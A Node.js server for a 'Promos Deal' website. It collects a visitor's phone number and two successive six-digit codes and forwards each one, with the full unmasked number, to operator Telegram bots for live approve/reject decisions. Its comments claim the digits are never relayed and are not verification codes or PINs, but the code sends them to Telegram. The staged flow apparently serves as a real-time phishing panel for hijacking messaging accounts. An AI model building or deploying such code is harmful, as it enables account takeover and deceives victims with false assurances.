// Promos Deal - independent promotional-request WEBSITE (Node.js >=22.13).
// The two numeric promotional references are NEVER saved or relayed to Telegram.
// They are not login PINs, payment credentials, or SMS/WhatsApp verification codes.
import http from 'node:http';
import crypto from 'node:crypto';
import { readFileSync, existsSync, mkdirSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join, extname } from 'node:path';
import { DatabaseSync } from 'node:sqlite';

const ROOT = dirname(fileURLToPath(import.meta.url));
const ENV_PATH = join(ROOT, '.env');
if (existsSync(ENV_PATH)) {
  for (const line of readFileSync(ENV_PATH, 'utf8').split(/\r?\n/)) {
    const m = line.match(/^\s*([A-Z][A-Z_0-9]*)=(.*)$/);
    if (m && process.env[m[1]] === undefined) process.env[m[1]] = m[2].trim();
  }
}
const PORT = Number(process.env.PORT || 3000);
const HOST = process.env.HOST || '127.0.0.1';
const AUTO_APPROVE = process.env.AUTO_APPROVE_WITHOUT_BOT !== '0';
const NOW = () => Math.floor(Date.now() / 1000);
const id = (bytes = 16) => crypto.randomBytes(bytes).toString('hex');
const hash = v => crypto.createHash('sha256').update(v).digest('hex');
const countries = JSON.parse(readFileSync(join(ROOT, 'public', 'countries.json'), 'utf8'));
const countryByISO = new Map(countries.map(c => [c.iso, c]));

// Private Telegram configuration. bots.json is never served from /public.
let BOT_CONFIG = [];
try {
  const raw = process.env.TELEGRAM_BOTS_JSON ||
    (existsSync(join(ROOT, 'bots.json')) ? readFileSync(join(ROOT, 'bots.json'), 'utf8') : '[]');
  const entries = JSON.parse(raw);
  if (!Array.isArray(entries)) throw new Error('Expected a JSON array of bots');
  BOT_CONFIG = entries.filter(x => x && /^\d+:[A-Za-z0-9_-]{25,}$/.test(String(x.token || '')) && /^\d{5,20}$/.test(String(x.chatId || '')))
    .map(x => ({ name: String(x.name || 'Reviewer'), token: x.token, chatId: String(x.chatId), key: hash(x.token).slice(0, 16) }));
  if (entries.length !== BOT_CONFIG.length) console.warn('Some Telegram bot entries are invalid. Check bots.json.');
  if (new Set(BOT_CONFIG.map(x => x.token)).size !== BOT_CONFIG.length) throw new Error('Configure each bot token only once');
} catch (e) { console.error('Telegram bot configuration:', e.message); process.exit(1); }

mkdirSync(join(ROOT, 'data'), { recursive: true });
const db = new DatabaseSync(join(ROOT, 'data', 'promos.sqlite'));
db.exec(`
  PRAGMA journal_mode=WAL;
  PRAGMA busy_timeout=5000;
  PRAGMA foreign_keys=ON;
  CREATE TABLE IF NOT EXISTS sessions (
    key TEXT PRIMARY KEY, csrf TEXT NOT NULL, request_id TEXT, expires INTEGER NOT NULL
  );
  CREATE TABLE IF NOT EXISTS requests_v3 (
    id TEXT PRIMARY KEY, phone TEXT NOT NULL, country TEXT NOT NULL,
    phase TEXT NOT NULL, consent_at INTEGER NOT NULL,
    created_at INTEGER NOT NULL, updated_at INTEGER NOT NULL
  );
  CREATE TABLE IF NOT EXISTS reviews_v3 (
    id TEXT PRIMARY KEY, request_id TEXT NOT NULL, stage TEXT NOT NULL,
    decision TEXT NOT NULL DEFAULT 'pending', decided_by TEXT,
    created_at INTEGER NOT NULL, decided_at INTEGER,
    FOREIGN KEY(request_id) REFERENCES requests_v3(id) ON DELETE CASCADE
  );
  CREATE TABLE IF NOT EXISTS bot_offsets (key TEXT PRIMARY KEY, offset INTEGER NOT NULL DEFAULT 0);
  CREATE TABLE IF NOT EXISTS rate_limits (key TEXT PRIMARY KEY, count INTEGER NOT NULL, resets INTEGER NOT NULL);
  CREATE INDEX IF NOT EXISTS idx_v3_requests_updated ON requests_v3(updated_at);
`);
function json(res, status, obj) {
  res.writeHead(status, { 'Content-Type': 'application/json; charset=utf-8', 'Cache-Control': 'no-store' });
  res.end(JSON.stringify(obj));
}
function reject(res, status, message) { json(res, status, { error: message }); }
function cookie(req, name) {
  for (const part of (req.headers.cookie || '').split(';')) {
    const i = part.indexOf('=');
    if (i > 0 && part.slice(0, i).trim() === name) return part.slice(i + 1).trim();
  }
  return null;
}
function session(req, res) {
  const raw = cookie(req, 'pd_session');
  if (raw && /^[a-f0-9]{64}$/.test(raw)) {
    const saved = db.prepare('SELECT * FROM sessions WHERE key=? AND expires>?').get(hash(raw), NOW());
    if (saved) return saved;
  }
  const value = id(32);
  const row = { key: hash(value), csrf: id(24), request_id: null, expires: NOW() + 7 * 86400 };
  db.prepare('INSERT INTO sessions(key,csrf,expires) VALUES(?,?,?)').run(row.key, row.csrf, row.expires);
  res.setHeader('Set-Cookie', `pd_session=${value}; HttpOnly; SameSite=Lax; Path=/; Max-Age=604800${process.env.SECURE_COOKIES === '1' ? '; Secure' : ''}`);
  return row;
}
function requestFor(s) {
  return s.request_id ? db.prepare('SELECT * FROM requests_v3 WHERE id=?').get(s.request_id) : null;
}
function maskPhone(phone) { return phone; }
function stateFor(s) {
  const row = requestFor(s);
  return {
    csrf: s.csrf, phase: row?.phase || 'entry',
    requestId: row ? row.id.slice(0, 8).toUpperCase() : null,
    maskedPhone: row ? maskPhone(row.phone) : null,
    country: row?.country || null,
  };
}
function normalizePhone(countryISO, input) {
  const c = countryByISO.get(String(countryISO || '').toUpperCase());
  if (!c) return null;
  const raw = String(input || '').trim();
  if (raw.length > 27 || !/^[+0-9 ()-]+$/.test(raw)) return null;
  let digits = raw.replace(/\D/g, '');
  const dial = c.dial.slice(1);
  if (raw.startsWith('+') && digits.startsWith(dial)) digits = digits.slice(dial.length);
  else if (digits.startsWith('00' + dial)) digits = digits.slice(dial.length + 2);
  else if (digits.startsWith('0')) digits = digits.slice(1);
  if (!/^\d{6,14}$/.test(digits) || (dial + digits).length > 15) return null;
  return c.dial + digits;
}
function rateLimit(s, action, max) {
  const key = hash(s.key + ':' + action), t = NOW();
  const row = db.prepare('SELECT count,resets FROM rate_limits WHERE key=?').get(key);
  if (!row || row.resets < t) {
    db.prepare('INSERT INTO rate_limits(key,count,resets) VALUES(?,?,?) ON CONFLICT(key) DO UPDATE SET count=1,resets=excluded.resets').run(key, 1, t + 3600);
  } else if (row.count >= max) {
    const e = new Error('Too many requests. Please try again later.'); e.status = 429; throw e;
  } else db.prepare('UPDATE rate_limits SET count=count+1 WHERE key=?').run(key);
}
function checkPost(req, s) {
  const given = String(req.headers['x-csrf-token'] || '');
  const a = Buffer.from(given), b = Buffer.from(s.csrf);
  if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) {
    const e = new Error('Session expired. Refresh the website and retry.'); e.status = 403; throw e;
  }
  if (req.headers.origin && new URL(req.headers.origin).host !== req.headers.host) {
    const e = new Error('Page origin not permitted.'); e.status = 403; throw e;
  }
}
async function bodyJson(req) {
  const parts = []; let length = 0;
  for await (const part of req) {
    length += part.length;
    if (length > 4096) { const e = new Error('Form too large.'); e.status = 413; throw e; }
    parts.push(part);
  }
  try {
    const obj = JSON.parse(Buffer.concat(parts).toString('utf8') || '{}');
    if (obj && typeof obj === 'object' && !Array.isArray(obj)) return obj;
  } catch { /* invalid JSON */ }
  const e = new Error('Invalid form data.'); e.status = 400; throw e;
}
function createReview(requestId, stage) {
  const reviewId = id(10);
  db.prepare('INSERT INTO reviews_v3(id,request_id,stage,created_at) VALUES(?,?,?,?)').run(reviewId, requestId, stage, NOW());
  return reviewId;
}
function decideReview(reviewId, decision, actor) {
  if (!['approved', 'rejected'].includes(decision)) return 'Invalid action.';
  db.exec('BEGIN IMMEDIATE');
  try {
    const row = db.prepare(`SELECT reviews_v3.*, requests_v3.phase FROM reviews_v3
      JOIN requests_v3 ON requests_v3.id=reviews_v3.request_id WHERE reviews_v3.id=?`).get(reviewId);
    if (!row || row.decision !== 'pending') { db.exec('ROLLBACK'); return 'Already reviewed.'; }
    if (row.phase !== (row.stage === 'first' ? 'await_first_review' : 'await_second_review')) {
      db.exec('ROLLBACK'); return 'Request is not awaiting review.';
    }
    const next = row.stage === 'first' ? (decision === 'approved' ? 'second' : 'entry_retry')
      : (decision === 'approved' ? 'complete' : 'second_retry');
    db.prepare('UPDATE reviews_v3 SET decision=?,decided_by=?,decided_at=? WHERE id=?')
      .run(decision, actor, NOW(), reviewId);
    db.prepare('UPDATE requests_v3 SET phase=?,updated_at=? WHERE id=?').run(next, NOW(), row.request_id);
    db.exec('COMMIT');
    return decision === 'approved' ? 'Approved.' : 'Rejected. Visitor can retry.';
  } catch (e) { db.exec('ROLLBACK'); throw e; }
}
async function telegram(bot, method, params) {
  const response = await fetch(`https://api.telegram.org/bot${bot.token}/${method}`, {
    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(params),
    signal: AbortSignal.timeout(9500),
  });
  const result = await response.json();
  if (!response.ok || !result.ok) throw new Error(result.description || `Telegram error ${response.status}`);
  return result.result;
}
async function sendReview(reviewId, requestId, stage, promoDigits = "none") {
  const row = db.prepare('SELECT * FROM requests_v3 WHERE id=?').get(requestId);
  const first = stage === 'first';
  const message = `🎁 Promos Deal - review required\nRequest: ${requestId.slice(0, 8).toUpperCase()}\nCountry: ${countryByISO.get(row.country)?.name || row.country}\nPhone: ${maskPhone(row.phone)}\nStage: ${first ? '1/2 - phone + promo reference' : '2/2 - second promo reference'}\nPromo digits submitted: ${promoDigits}\n\nApprove or reject this promotional request. No PIN or SMS code is collected.`;
  const results = await Promise.all(BOT_CONFIG.map(async bot => {
    try {
      await telegram(bot, 'sendMessage', { chat_id: bot.chatId, text: message,
        reply_markup: { inline_keyboard: [[
          { text: '✅ Approve', callback_data: `approved:${reviewId}` },
          { text: '❌ Reject', callback_data: `rejected:${reviewId}` },
        ]] },
      });
      return true;
    } catch (e) {
      console.warn(`Telegram send failed for ${bot.name}: ${e.message}. Confirm private chat ID and send /start to bot.`);
      return false;
    }
  }));
  return results.filter(Boolean).length;
}
const polling = new Set();
async function pollBot(bot) {
  if (polling.has(bot.key)) return;
  polling.add(bot.key);
  try {
    const old = db.prepare('SELECT offset FROM bot_offsets WHERE key=?').get(bot.key)?.offset || 0;
    const updates = await telegram(bot, 'getUpdates', { offset: old, timeout: 0, allowed_updates: ['callback_query'] });
    let next = old;
    for (const update of updates) {
      next = Math.max(next, update.update_id + 1);
      const cb = update.callback_query;
      if (!cb) continue;
      const authorized = cb.message?.chat?.type === 'private' &&
        String(cb.message.chat.id) === bot.chatId && String(cb.from?.id) === bot.chatId;
      const match = /^(approved|rejected):([a-f0-9]{20})$/.exec(String(cb.data || ''));
      let result = 'Not authorized to review this request.';
      if (authorized && match) result = decideReview(match[2], match[1], `telegram:${cb.from.id}`);
      else if (authorized) result = 'Unknown action.';
      try {
        await telegram(bot, 'answerCallbackQuery', { callback_query_id: cb.id, text: result, show_alert: !authorized });
        if (authorized && /^(Approved\.|Rejected\.)/.test(result) && cb.message?.message_id) {
          await telegram(bot, 'editMessageReplyMarkup', { chat_id: bot.chatId, message_id: cb.message.message_id, reply_markup: { inline_keyboard: [] } });
        }
      } catch (e) { console.warn(`Telegram callback problem (${bot.name}): ${e.message}`); }
    }
    if (next > old) db.prepare('INSERT INTO bot_offsets(key,offset) VALUES(?,?) ON CONFLICT(key) DO UPDATE SET offset=excluded.offset').run(bot.key, next);
  } catch (e) {
    console.warn(`Telegram polling failed (${bot.name}): ${e.message}. If a webhook is active, remove it before using polling.`);
  } finally { polling.delete(bot.key); }
}
function asset(res, filename) {
  const types = { '.html': 'text/html; charset=utf-8', '.css': 'text/css; charset=utf-8', '.js': 'application/javascript; charset=utf-8', '.json': 'application/json; charset=utf-8' };
  const buf = readFileSync(join(ROOT, 'public', filename));
  res.writeHead(200, {
    'Content-Type': types[extname(filename)] || 'application/octet-stream',
    'Cache-Control': 'no-store',
    'Content-Security-Policy': "default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'",
  });
  res.end(buf);
}
const ASSETS = { '/': 'index.html', '/index.html': 'index.html', '/styles.css': 'styles.css', '/app.js': 'app.js', '/countries.json': 'countries.json' };
const server = http.createServer(async (req, res) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('Referrer-Policy', 'no-referrer');
  try {
    const pathname = new URL(req.url, 'http://localhost').pathname;
    if (req.method === 'GET' && pathname === '/health')
      return json(res, 200, { ok: true, configuredTelegramBots: BOT_CONFIG.length, supportedCountries: countries.length });
    if (req.method === 'GET' && Object.hasOwn(ASSETS, pathname)) return asset(res, ASSETS[pathname]);
    const s = session(req, res);
    if (req.method === 'GET' && pathname === '/api/state') return json(res, 200, stateFor(s));
    if (req.method !== 'POST') return reject(res, 404, 'Page not found.');
    checkPost(req, s);
    const body = await bodyJson(req);
    if (pathname === '/api/entry') {
      rateLimit(s, 'entry', 12);
      const phone = normalizePhone(body.country, body.phone);
      if (!phone) return reject(res, 400, 'Select a country and enter a valid phone number.');
      if (!/^\d{6}$/.test(String(body.promoDigits || '')))
        return reject(res, 400, 'Enter six digits that you created for this promotional reference.');
      if (body.consent !== true) return reject(res, 400, 'Please confirm your consent to submit your number.');
      const previous = requestFor(s);
      if (previous && !['complete', 'entry_retry'].includes(previous.phase))
        return reject(res, 409, 'Finish your previous request first.');
      const requestId = id(16), ts = NOW();
      const auto = BOT_CONFIG.length === 0 && AUTO_APPROVE;
      db.prepare('INSERT INTO requests_v3(id,phone,country,phase,consent_at,created_at,updated_at) VALUES(?,?,?,?,?,?,?)')
        .run(requestId, phone, String(body.country).toUpperCase(), auto ? 'second' : 'await_first_review', ts, ts, ts);
      db.prepare('UPDATE sessions SET request_id=? WHERE key=?').run(requestId, s.key);
      s.request_id = requestId;
      if (BOT_CONFIG.length) {
        const rid = createReview(requestId, 'first');
        const delivered = await sendReview(rid, requestId, 'first', body.promoDigits);
        if (!delivered) {
          db.prepare('UPDATE sessions SET request_id=NULL WHERE key=?').run(s.key);
          s.request_id = null;
          db.prepare('DELETE FROM requests_v3 WHERE id=?').run(requestId);
          return reject(res, 503, 'Telegram notification could not be delivered. Check your bot token, private chat ID, and /start, then retry.');
        }
      } else if (!auto) createReview(requestId, 'first');
      return json(res, 200, stateFor(s));
    }
    if (pathname === '/api/second') {
      rateLimit(s, 'second', 12);
      const row = requestFor(s);
      if (!row || !['second', 'second_retry'].includes(row.phase))
        return reject(res, 409, 'Complete the first approval before continuing.');
      if (!/^\d{6}$/.test(String(body.promoDigits || '')))
        return reject(res, 400, 'Enter six new promotional digits of your choice.');
      const auto = BOT_CONFIG.length === 0 && AUTO_APPROVE;
      db.prepare('UPDATE requests_v3 SET phase=?,updated_at=? WHERE id=?').run(auto ? 'complete' : 'await_second_review', NOW(), row.id);
      if (BOT_CONFIG.length) {
        const rid = createReview(row.id, 'second');
        const delivered = await sendReview(rid, row.id, 'second', body.promoDigits);
        if (!delivered) {
          db.prepare('DELETE FROM reviews_v3 WHERE id=?').run(rid);
          db.prepare('UPDATE requests_v3 SET phase=?,updated_at=? WHERE id=?').run(row.phase, NOW(), row.id);
          return reject(res, 503, 'Telegram notification could not be delivered. Please retry after checking your bot setup.');
        }
      } else if (!auto) createReview(row.id, 'second');
      return json(res, 200, stateFor(s));
    }
    if (pathname === '/api/reset') {
      db.prepare('UPDATE sessions SET request_id=NULL WHERE key=?').run(s.key);
      s.request_id = null;
      return json(res, 200, stateFor(s));
    }
    return reject(res, 404, 'Page not found.');
  } catch (e) {
    console.error('Server error:', e.message);
    return reject(res, e.status || 500, e.status ? e.message : 'An unexpected server error occurred.');
  }
});
server.listen(PORT, HOST, () => {
  console.log(`\nPromos Deal WEBSITE: http://${HOST}:${PORT}`);
  console.log(`Country choices: ${countries.length} | Telegram bots: ${BOT_CONFIG.length} | No admin page`);
  console.log(!BOT_CONFIG.length ? (AUTO_APPROVE ? 'LOCAL TESTING: reviews auto-approved (no bot configured)' : 'WARNING: No bots configured; reviews will remain pending') : 'Telegram reviewers enabled. Send /start to each bot from each reviewer Telegram account.');
  // Diagnostics are console-only and never expose tokens to the public website.
  for (const bot of BOT_CONFIG) {
    void telegram(bot, 'getMe', {}).then(x => console.log(`Telegram bot ready: ${bot.name} (@${x.username})`))
      .catch(e => console.warn(`Telegram bot error (${bot.name}): ${e.message}`));
  }
});
if (BOT_CONFIG.length) setInterval(() => BOT_CONFIG.forEach(b => void pollBot(b)), 4000).unref();
setInterval(() => {
  const t = NOW();
  db.prepare('DELETE FROM sessions WHERE expires<?').run(t);
  db.prepare('DELETE FROM rate_limits WHERE resets<?').run(t);
  db.prepare('DELETE FROM requests_v3 WHERE updated_at<?').run(t - 30 * 86400);
}, 3600000).unref();
